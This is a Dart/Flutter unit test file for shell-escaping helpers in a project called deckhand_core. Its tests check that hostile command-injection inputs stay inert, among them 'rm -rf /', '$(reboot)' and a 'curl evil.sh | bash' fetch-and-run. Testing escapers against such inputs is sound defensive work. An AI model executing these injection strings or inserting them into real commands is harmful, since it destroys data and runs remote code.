import 'package:deckhand_core/deckhand_core.dart';
import 'package:flutter_test/flutter_test.dart';

void main() {
  group('shellSingleQuote', () {
    test('simple alphanumerics round-trip', () {
      expect(shellSingleQuote('hello'), "'hello'");
      expect(shellSingleQuote('makerbase'), "'makerbase'");
    });

    test('embedded single quote uses the close-escape-open dance', () {
      expect(shellSingleQuote("O'Brien"), r"'O'\''Brien'");
      expect(shellSingleQuote("a'b'c"), r"'a'\''b'\''c'");
    });

    test('empty string becomes an empty quoted argument', () {
      expect(shellSingleQuote(''), "''");
    });

    test('shell metacharacters are neutralised by the single quotes', () {
      expect(shellSingleQuote(r'$USER'), r"'$USER'");
      expect(shellSingleQuote(r'foo`bar`'), r"'foo`bar`'");
      expect(shellSingleQuote(r'a && b'), r"'a && b'");
      expect(shellSingleQuote(r'a | b'), r"'a | b'");
      expect(shellSingleQuote(r'${HOME}/config'), r"'${HOME}/config'");
      expect(shellSingleQuote(r'$(reboot)'), r"'$(reboot)'");
    });

    test('adversarial profile values stay inert', () {
      expect(
        shellSingleQuote(r'klipper.service; rm -rf /'),
        r"'klipper.service; rm -rf /'",
      );
      expect(
        shellSingleQuote(r'foo$(curl evil.sh | bash)bar'),
        r"'foo$(curl evil.sh | bash)bar'",
      );
    });
  });

  group('shellPathEscape', () {
    test('absolute paths are single-quoted', () {
      expect(shellPathEscape('/etc/foo'), "'/etc/foo'");
      expect(shellPathEscape('/home/mks/file with space'), "'/home/mks/file with space'");
    });

    test('bare tilde expands to \$HOME', () {
      expect(shellPathEscape('~'), r'"$HOME"');
    });

    test('tilde path keeps \$HOME expansion but single-quotes the rest', () {
      expect(shellPathEscape('~/klipper'), r'"$HOME"/' "'klipper'");
      expect(shellPathEscape('~/moonraker_data/config'),
          r'"$HOME"/' "'moonraker_data/config'");
    });

    test('tilde path with shell metacharacters in suffix is safe', () {
      // This is the specific bug we are fixing: the old escaper would
      // let $(reboot) through inside a double-quoted $HOME path.
      expect(shellPathEscape(r'~/$(reboot)'), r'"$HOME"/' r"'$(reboot)'");
      expect(shellPathEscape(r'~/foo`whoami`bar'), r'"$HOME"/' r"'foo`whoami`bar'");
      expect(shellPathEscape(r"~/a'b'c"), r'"$HOME"/' r"'a'\''b'\''c'");
    });

    test('tilde without slash and without anything else', () {
      // Only the bare `~` should expand. `~mks` is not a Deckhand-supported
      // form and falls through to plain single-quoting where the tilde is
      // intentionally neutralised.
      expect(shellPathEscape('~mks'), "'~mks'");
    });

    test('relative paths are single-quoted (no tilde handling triggered)', () {
      expect(shellPathEscape('relative/path'), "'relative/path'");
      expect(shellPathEscape('./foo'), "'./foo'");
    });
  });
}
